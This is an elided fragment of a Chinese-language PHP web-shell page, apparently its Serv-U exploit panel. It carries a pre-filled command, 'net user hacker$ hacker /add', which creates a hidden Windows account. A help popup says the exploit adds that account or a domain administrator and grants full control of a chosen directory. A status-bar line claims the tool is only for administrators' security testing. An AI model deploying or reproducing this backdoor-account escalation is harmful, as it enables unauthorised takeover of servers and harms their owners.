...
<body style="table-layout:fixed; word-break:break-all onmouseover="window.status='设计:幽月  仅限于网站管理员安全检测用,请务使用于非法用途,后果作者概不负责';return true" style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)">
<center>
<?php
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <tr class="secondalt">
	...
	?>
      Command　:
      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user hacker$ hacker /add" size="50"> &nbsp;<a href="?action=SUExp&job=adduser">(添加用户)</a> -  <a href="#" title="使用说明" onClick="alert('不选择添加用户功能则会添加hacker$密码为hacker的帐号并在EXP结束后删除域和hacker。\n\n添加用户功能是用来自己添加一个域管理员帐号用的，不执行site exec 命令。\n\n进行这个操作将会得到一个你选目录完全控制权限的域管理。')">(?)</a>
